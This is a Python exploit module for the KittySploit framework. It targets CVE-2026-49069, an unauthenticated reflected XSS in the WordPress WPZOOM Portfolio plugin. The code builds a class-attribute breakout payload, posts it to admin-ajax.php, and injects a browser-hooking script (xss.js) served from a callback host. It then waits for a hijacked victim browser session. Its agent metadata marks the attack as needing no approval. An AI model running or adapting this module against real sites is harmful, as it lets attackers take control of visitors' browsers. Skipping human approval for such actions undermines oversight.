#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress
from lib.protocols.http.xss_browser_hook import XssBrowserHookMixin

_PLUGIN = "wpzoom-portfolio"
_VULN_HIGH = (1, 4, 21)
_CVE = "CVE-2026-49069"


class Module(Auxiliary, Http_client, Wordpress, XssBrowserHookMixin):
    __info__ = {
        "name": "WordPress WPZOOM Portfolio <= 1.4.21 - Reflected XSS (browser_server)",
        "description": (
            "Unauthenticated reflected XSS via wpzoom_load_more_items. Injects "
            "browser_server hook (xss.js) through posts_data.class attribute breakout. "
            "Default trigger uses tabindex+autofocus+onfocus (no hover); mouseover fallback available."
        ),
        "author": ["Kent Apostol", "KittySploit Team"],
        "cve": _CVE,
        "references": [
            "https://wordpress.org/plugins/wpzoom-portfolio/",
            "https://www.cve.org/CVERecord?id=CVE-2026-49069",
        ],
        "tags": [
            "wordpress",
            "xss",
            "reflected-xss",
            "unauthenticated",
            "admin-ajax",
            "browser-c2",
            "browser_server",
        ],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 1.0,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'endpoints', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    callback_host = OptString(
        "",
        "Reachable host:port or URL for inject.js (empty = browser_server / lhost)",
        required=False,
    )
    offset = OptInteger(0, "Portfolio items offset for load-more query", required=False)
    trigger_mode = OptChoice(
        "autofocus",
        "XSS trigger: autofocus+onfocus (no hover) or onmouseover (hover)",
        required=False,
        choices=["autofocus", "mouseover"],
    )
    hook_browser = OptBool(
        True,
        "Load browser_server xss.js (requires browser_server start)",
        required=False,
    )
    wait_session = OptBool(
        True,
        "Wait for a new browser_server session after delivering the hook",
        required=False,
    )
    wait_timeout = OptInteger(120, "Seconds to wait for browser session callback", required=False)
    xss_payload = OptString(
        "",
        "Custom JS for the event handler (empty = browser_server hook or alert PoC)",
        required=False,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _admin_ajax_path(self) -> str:
        base = self._wp_base()
        return f"{base}/wp-admin/admin-ajax.php" if base != "/" else "/wp-admin/admin-ajax.php"

    def _opt_bool(self, option, default: bool = False) -> bool:
        return self._to_bool(getattr(option, "value", option) if option is not None else default)

    def _resolve_js_expression(self) -> str:
        custom = self._opt_value(self.xss_payload)
        if custom:
            return custom

        if not self._opt_bool(self.hook_browser, True):
            return "alert(document.domain)"

        server = self._get_browser_server()
        if not server:
            print_warning(
                "browser_server is not running — falling back to alert(document.domain). "
                "Start with: browser_server start"
            )
            return "alert(document.domain)"

        callback = self._opt_value(self.callback_host)
        base = self.resolve_hook_base_url(callback)
        print_info(f"browser_server hook URL: {base}/xss.js")
        return self.build_inject_js_loader_js(callback_host=callback)

    def _trigger_mode(self) -> str:
        return self.normalize_trigger_mode(self._opt_value(self.trigger_mode) or "autofocus")

    def _send_probe(self, js_expr: str):
        class_value = self.build_attribute_breakout_class(js_expr, trigger=self._trigger_mode())
        payload = {
            "action": "wpzoom_load_more_items",
            "offset": str(int(self.offset)),
            "posts_data": self.build_wpzoom_posts_data(class_value),
        }
        return self.http_request(
            method="POST",
            path=self._admin_ajax_path(),
            data=payload,
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "*/*",
            },
            allow_redirects=False,
            timeout=15,
        )

    def _reflection_needle(self, js_expr: str) -> str:
        return self.build_reflection_needle(js_expr, trigger=self._trigger_mode())

    def check(self):
        version = self.wp_plugin_version(_PLUGIN, self._wp_base())
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return {
                "vulnerable": False,
                "reason": f"WPZOOM Portfolio {version} appears patched (> 1.4.21)",
                "confidence": "high",
            }

        token = "KSPLT_CHECK"
        response = self._send_probe(f"alert('{token}')")
        if not response:
            return {"vulnerable": False, "reason": "No response", "confidence": "low"}

        body = response.text or ""
        if self._reflection_needle(f"alert('{token}')") in body:
            return {
                "vulnerable": True,
                "reason": "Reflected XSS confirmed via class attribute breakout",
                "confidence": "high",
            }

        version_ok = bool(version and self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH))
        return {
            "vulnerable": version_ok,
            "reason": "Active probe inconclusive; ensure published portfolio items exist",
            "confidence": "medium" if version_ok else "low",
        }

    def run(self):
        print_status(f"Checking {_CVE} on {self._admin_ajax_path()}...")
        result = self.check()
        if not result.get("vulnerable"):
            print_error(result.get("reason", "Target does not appear vulnerable"))
            return False
        print_success(result["reason"])

        server = self._get_browser_server()
        known_sessions = set((getattr(server, "sessions", {}) or {}).keys()) if server else set()

        js_expr = self._resolve_js_expression()
        response = self._send_probe(js_expr)
        if not response or response.status_code != 200:
            print_error(f"Exploit request failed (HTTP {getattr(response, 'status_code', '?')})")
            return False

        body = response.text or ""
        needle = self._reflection_needle(js_expr)
        if needle in body:
            idx = body.find(needle)
            print_success("Reflected XSS payload present in AJAX response")
            print_info(f"...{body[max(0, idx - 60):idx + len(needle) + 60]}...")
        else:
            print_warning(
                "Payload delivered but reflection not visible — site may have no published portfolio items"
            )

        mode = self._trigger_mode()
        if mode == "autofocus":
            print_info(
                "Trigger: tabindex+autofocus+onfocus — hook runs when the injected node receives "
                "focus (typically right after AJAX HTML is rendered)."
            )
            print_warning(
                "Some browsers ignore autofocus on innerHTML-inserted nodes; use "
                "set trigger_mode mouseover if the hook does not callback."
            )
        else:
            print_warning(
                "Trigger: onmouseover — victim must hover the injected portfolio item."
            )

        hook_delivered = "createElement" in js_expr and server is not None
        if self._opt_bool(self.wait_session, True) and hook_delivered:
            session_id = self.wait_for_browser_session(
                timeout=float(int(self._opt_value(self.wait_timeout) or 120)),
                known_sessions=known_sessions,
            )
            if session_id:
                return session_id

        return needle in body or bool(result.get("vulnerable"))
